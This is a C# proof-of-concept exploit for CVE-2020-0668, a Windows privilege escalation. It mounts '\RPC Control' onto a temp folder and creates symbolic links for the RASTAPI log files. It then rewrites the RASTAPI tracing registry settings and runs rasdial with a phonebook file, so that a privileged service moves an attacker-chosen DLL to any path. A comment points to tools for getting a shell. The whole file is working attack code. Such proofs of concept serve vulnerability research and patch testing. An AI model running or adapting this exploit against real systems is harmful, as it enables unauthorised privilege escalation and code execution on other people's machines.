using NtApiDotNet;
using System;
using System.Threading;
using System.IO;
using Microsoft.Win32;
using System.Diagnostics;

//TODO actually get shells using https://github.com/itm4n/UsoDllLoader OR https://github.com/xct/diaghub

namespace CVE_2020_0668
{
    class Program
    {
        static void Main(string[] args)
        {
            if (args.Length != 2)
            {
                Console.WriteLine("Use CVE-2020-0668 to perform an arbitrary privileged file move operation.");
                Console.WriteLine($"Usage: inFilePath outFilePath");
                return;
            }
            String inDLLPath = args[0];
            String outDllPath = args[1];

            if (!File.Exists(inDLLPath))
            {
                Console.WriteLine($@"[!] Cannot find {inDLLPath}!");
                return;
            }
            Console.WriteLine(String.Format("[+] Moving {0} to {1}", inDLLPath, outDllPath));

            String tempDirectory = GetTemporaryDirectory();
            const string ObjectDirectory = @"\RPC Control";

            Console.WriteLine($@"[+] Mounting {ObjectDirectory} onto {tempDirectory}");
            string tempDirectoryNt = NtFileUtils.DosFileNameToNt(tempDirectory);
            NtFile.CreateMountPoint(tempDirectoryNt, ObjectDirectory, "");

            Console.WriteLine("[+] Creating symbol links");

            
            var logFileSymlnk = NtSymbolicLink.Create($@"{ObjectDirectory}\RASTAPI.LOG", $@"\??\{inDLLPath}");
            var oldFileSymlnk = NtSymbolicLink.Create($@"{ObjectDirectory}\RASTAPI.OLD", $@"\??\{outDllPath}");

            Console.WriteLine(@"[+] Updating the HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Tracing\RASPLAP configuration.");
            Console.WriteLine(@"[+] Sleeping for 5 seconds so the changes take effect");
            UpdateRASTAPITracingConfig(tempDirectory, true, 0x1000);
            Thread.Sleep(5000); // might have to sleep for the update to take effect 


            string phonebookPath = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString() + ".pbk");
            Console.WriteLine($"[+] Writing phonebook file to {phonebookPath}");
            File.WriteAllText(phonebookPath, CVE_2020_0668.Properties.Resources.Phonebook);

            using (Process p = new Process())
            {
                p.StartInfo.FileName = "rasdial";
                p.StartInfo.Arguments = $@"VPNTEST test test /PHONEBOOK:{phonebookPath}";
                p.StartInfo.CreateNoWindow = true;
                p.StartInfo.UseShellExecute = false;
                p.Start();
                p.WaitForExit();
            }

            Console.WriteLine("[+] Cleaning up");
            File.Delete(phonebookPath);
            Directory.Delete(tempDirectory, true);
            logFileSymlnk.Close();
            oldFileSymlnk.Close();
            UpdateRASTAPITracingConfig(@"%windir%\tracing", false, 0x100000); //those are the default values

            
            Console.WriteLine("[+] Done!");
        }

        static public void UpdateRASTAPITracingConfig(string logDirectory, bool enabled, int logSize)
        {
            using (RegistryKey HKLocalMachine = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
            {
                using (RegistryKey key = HKLocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Tracing\RASTAPI", true))
                {
                    if (key != null)
                    {
                        key.SetValue(@"FileDirectory", logDirectory);
                        key.SetValue(@"MaxFileSize", logSize);
                        key.SetValue(@"EnableFileTracing", enabled ? 1 : 0);
                    }
                    else
                    {
                        Console.WriteLine(@"[!] Failed to open HKLM\SOFTWARE\Microsoft\Tracing\RASTAPI with write access!");
                        System.Environment.Exit(1);
                    }
                }
            }
        }
        static public string GetTemporaryDirectory()
        {
            string tempDirectory = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());
            Directory.CreateDirectory(tempDirectory);
            return tempDirectory;
        }

    }
}
